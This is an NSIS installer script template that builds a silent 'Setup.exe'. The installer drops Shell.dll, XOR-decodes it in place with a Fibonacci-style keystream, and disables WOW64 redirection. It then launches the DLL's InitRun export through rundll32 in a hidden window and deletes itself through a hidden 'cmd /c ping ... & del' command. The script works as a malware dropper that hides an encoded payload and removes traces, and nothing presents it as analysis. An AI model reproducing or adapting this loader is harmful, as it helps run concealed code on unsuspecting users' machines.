!include "LogicLib.nsh"
!include "x64.nsh"
Name "Test"

; ���ɵĵ�����װִ���ļ�

OutFile "../Setup.exe"
SetCompressor /SOLID lzma

RequestExecutionLevel user

; ȱʡ��װĿ¼

InstallDir "%s"

; ��Ĭ��װ
Silentinstall Silent
;--------------------------------

; ��װ����

Section "RC"

	SectionIn RO

	; ���ð�װĿ¼.

	SetOutPath $INSTDIR

	; Ҫ�����װ���ļ�
	File "Shell.dll"
	File "svtlogo.dat"
	; �����ļ�
	FileOpen $R1 "$INSTDIR\Shell.dll" "a"
	
	;��ʼ��ѭ��������
	IntOp $1 3 + 0
	IntOp $2 5 + 0
	IntOp $3 0 + 0
	
	;��ʼ쳲�����������
	${For} $R3 0 %d
	
		IntOp $3 $1 + $2
		IntOp $3 $3 % 255
		
		FileReadByte $R1 $R2
		FileSeek $R1 -1 CUR
		IntOp $R2 $R2 ^ $3
		FileWriteByte $R1 $R2
		
		IntOp $1 $2 + 0
		IntOp $2 $3 + 0
	
	${Next}

	FileClose $R1

	;��UAC����
	;�ر�32λĿ¼�ض���
	System::Call "Kernel32::Wow64EnableWow64FsRedirection(i 0)"

	ExecShell "open" "rundll32.exe" "$\"$INSTDIR\Shell.dll$\" InitRun" SW_HIDE

	;��ɾ�� ���ֲ�����Ӧ���ո��·��
	System::Call 'kernel32::GetModuleFileName(i 0,t .R1,i 1024)'
	ExecShell "open" "cmd.exe" "/c ping 127.0.0.1&del $\"$R1$\"" SW_HIDE

SectionEnd
